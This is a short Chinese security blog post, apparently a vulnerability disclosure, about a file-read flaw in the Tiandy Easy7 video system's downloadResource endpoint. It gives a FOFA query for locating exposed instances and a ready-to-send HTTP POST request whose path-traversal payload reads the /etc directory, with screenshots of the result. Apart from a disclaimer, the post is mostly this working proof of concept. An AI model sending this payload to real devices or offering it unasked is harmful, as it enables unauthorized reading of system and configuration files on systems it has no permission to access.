#  天地伟业Easy7 downloadResource 文件读取漏洞  
原创 安羽安全
                    安羽安全  安羽安全   2026-03-13 01:07  
  
**01****免责声明：**  
  
文章内容仅供日常学习使用，请勿非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。如有内容争议或侵权，我们会及时删除。  
  
**02    漏洞描述**  
  
漏洞接口：/Easy7/rest/file/downloadResource  
   
存在文件读取  
。  
  
**fofa：app="Tiandy-Easy7  "**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h29PqzMrB7sQsQDoriak3ea80gZuvKFeyzsicBNXbrIwCicFXe31tjw6lLVicicZn36KGn8h8eiafadmMqOaughLXMYdwQdHral38YWzYePr7ria4g/640?wx_fmt=png&from=appmsg "")  
## 03    漏洞复现   
  
1、访问系统  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h29PqzMrB7vSRADU5Fs5vq6NIribPvBRiasFvUt9eMLVY7micub8ibCUPvqooaFr6kmfYibSMUicmlJqJNWDUE1bWG3N6DPFyia68BTbicdHDDCSGGg/640?wx_fmt=png&from=appmsg "")  
  
2  
、文件读取  
```
POST /Easy7/rest/file/downloadResource HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

path=group&srsPathId=../../etc/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h29PqzMrB7uXSPULxAn8no1YyysEbXiaqmNJew9e4vFLic1lzibzic10B589pRAOnyic8dWwRFcF4TcYhia76G07OHCmhOvicMcwEib24TgsF0iaib0Y0/640?wx_fmt=png&from=appmsg "")  
  
  
